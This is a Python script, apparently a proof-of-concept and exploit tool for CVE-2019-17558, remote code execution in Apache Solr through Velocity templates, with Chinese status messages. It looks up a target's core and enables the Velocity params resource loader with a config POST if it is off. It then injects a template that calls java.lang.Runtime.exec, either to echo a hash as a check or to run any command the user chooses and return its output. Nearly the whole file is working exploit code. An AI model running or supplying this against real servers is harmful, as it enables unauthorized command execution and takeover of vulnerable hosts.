import requests
import json
import time
import random
import hashlib

HEADERS = {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "accept-encoding": "gzip, deflate",
    "accept-language": "en-US,en;q=0.5",
    "connection": "close",
    "user-agent": "mozilla/5.0 (x11; linux x86_64) applewebkit/537.36 (khtml, like gecko) chrome/62.0.3202.94 safari/537.36",
}


def Get_core(ip):
    try:
        url = ip + "/solr/admin/cores?indexInfo=false&wt=json"
        r = requests.get(url, timeout=25, headers=HEADERS, verify=False)
        core_name = list(json.loads(r.text)["status"])[0]
    except:
        return "core获取失败"
    return core_name




def main(ip):
    try:
        core = Get_core(ip)
        url = ip + '/solr/'+ core + '/config'
        r_open = requests.get(url, headers=HEADERS, verify=False, timeout=25)
        if '"params.resource.loader.enabled":"true"' in r_open.text:
            return Poc(ip)
        else:
            return Openparams(ip)
    except:
        return "缺少core值"


def main1(ip,cmd):
    try:
        core = Get_core(ip)
        url = ip + '/solr/'+ core + '/config'
        r_open = requests.get(url, headers=HEADERS, verify=False, timeout=25)
        if '"params.resource.loader.enabled":"true"' in r_open.text:
            return Exp(ip,cmd)
        else:
            return Openparams(ip)
    except:
        return "缺少core值"


def Openparams(ip):
    core = Get_core(ip)
    headers = {
        "Host" : ip,
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "user-agent": "mozilla/5.0 (x11; linux x86_64) applewebkit/537.36 (khtml, like gecko) chrome/62.0.3202.94 safari/537.36",
        "Content-Type": "application/json",
        "Content-Length": "259"
            }
    data = '''
        {
        "update-queryresponsewriter": {
        "startup": "lazy",
        "name": "velocity",
        "class": "solr.VelocityResponseWriter",
        "template.base.dir": "",
        "solr.resource.loader.enabled": "true",
        "params.resource.loader.enabled": "true"
            }
        }
        '''
    url = ip + '/solr/'+ core + '/config'
    requests.post(url, headers=headers, data=data, timeout=25, verify=False)
    r_open = requests.get(url, headers=HEADERS)
    if '"params.resource.loader.enabled":"true"' in r_open.text:
        return Poc(ip)
    else:
        return "不存在漏洞CVE_2019_17558"


def Poc(ip):
    s = str(random.randint(800000000, 900000000))
    m = hashlib.md5(s.encode())
    res = m.hexdigest()
    cmd = 'echo '+ res
    core = Get_core(ip)
    url = ip + '/solr/'+ core + f'/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27{cmd}%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end'
    r = requests.get(url, headers=HEADERS, verify=False, timeout=25)
    # print(r.text)
    if res in r.text:
        return "存在漏洞CVE-2019-17558,请及时修复!"
    else:
        return "不存在漏洞CVE-2019-17558"
        

def Exp(ip,cmd):
    core = Get_core(ip)
    url = ip + '/solr/'+ core + f'/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27{cmd}%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end'
    r = requests.get(url, headers=HEADERS, verify=False, timeout=25)
    if 'Error 500 {msg=Invocation of method &apos;' in r.text:
        return "别试了，这个命令不好用"
    else:
        return r.text


# if __name__ == '__main__':
#     main("http://192.168.1.1:8983")